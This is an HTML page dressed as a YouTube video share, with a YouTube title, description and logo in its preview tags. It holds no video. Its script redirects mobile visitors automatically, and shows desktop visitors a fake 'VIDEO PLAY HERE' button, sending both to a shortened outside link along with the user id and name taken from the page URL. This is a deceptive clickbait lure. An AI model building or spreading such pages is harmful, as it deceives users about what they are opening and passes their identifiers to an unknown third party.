<html>
<head>
<meta property="og:title" content="VIDEO PLAY HERE" />
<meta property="og:description"        content="Youtube.com" />
<meta property="og:image" content="https://www.youtube.com/yts/img/yt_1200-vfl4C3T0K.png" />
</head>
<body>
<style>
.button {
    background-color: #4CAF50;
    border: none;
    color: white;
    padding: 35px 62px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 20px;
    margin: 4px 2px;
    cursor: pointer;
}
</style>
<p id="demo">

</p>
<script type="text/javascript">

function generateRandomString(iLen) {
    var sRnd = '';
    var sChrs = "abcdefghiklmnopqrstuvwxyz";
    for (var i = 0; i < iLen; i++) {
      var randomPoz = Math.floor(Math.random() * sChrs.length);
      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
    }
    return sRnd;
  }

function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
    });
    return vars;
}
var id = getUrlVars()["id"];
var name = getUrlVars()["name"];
function visitPage(){
        window.location = "http://po.st/uMPZx8?uid="+id+"&name="+name;
    }

        if (screen.width <= 720) {
        window.location = "http://po.st/uMPZx8?uid="+id+"&name="+name;
    } else {
       document.getElementById("demo").innerHTML ="<h1><button class=button onclick=visitPage();> VIDEO PLAY HERE  </button></h1>"
    }

</script>
</body>
</html>